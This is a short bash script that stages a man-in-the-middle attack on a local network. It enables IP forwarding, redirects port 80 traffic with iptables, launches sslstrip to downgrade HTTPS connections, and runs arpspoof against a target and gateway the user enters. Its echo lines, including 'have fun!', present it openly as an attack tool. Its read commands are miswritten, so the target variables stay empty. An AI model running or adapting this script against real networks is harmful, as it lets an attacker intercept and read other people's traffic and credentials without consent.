echo Strip HTTPS to HTTP 
echo have fun! 
echo Enable IP fowarder
echo 1 > /proc/sys/net/ipv4/ip_forward
echo enabling port forwarding from a certain port to another port
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 
iptables -t nat -L PREROUTING  
sslstrip -h
echo ARP Spoofing attacl
echo Syntax: arpspoof -i interface -t target-ip target-gateway-ip
echo Place enter the target-ip 
read $targetIP
echo ""
echo Please enter the targetGatewayIP
read $targetGate
arpspoof -i eth0 -t $targetIP $targetGate

